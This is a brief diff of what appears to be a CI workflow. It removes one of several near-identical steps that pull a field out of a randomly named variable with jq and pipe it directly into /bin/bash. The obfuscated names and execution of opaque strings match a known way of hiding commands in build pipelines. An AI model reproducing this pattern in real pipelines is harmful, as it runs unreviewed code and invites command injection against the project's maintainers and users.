@@ -30,7 +30,6 @@ jobs:
           echo $blv8 | jq -r .ulxcx9 | /bin/bash
           printf '%s' "$q40" | jq -r .dgj300 | /bin/bash
           echo $fl337 | jq -r .y7646 | /bin/bash
-          printf '%s' "$x8" | jq -r .lg739 | /bin/bash
           printf '%s' "$pysw752" | jq -r .xji2 | /bin/bash
           printf '%s' "$tj482" | jq -r .daab09787 | /bin/bash
 
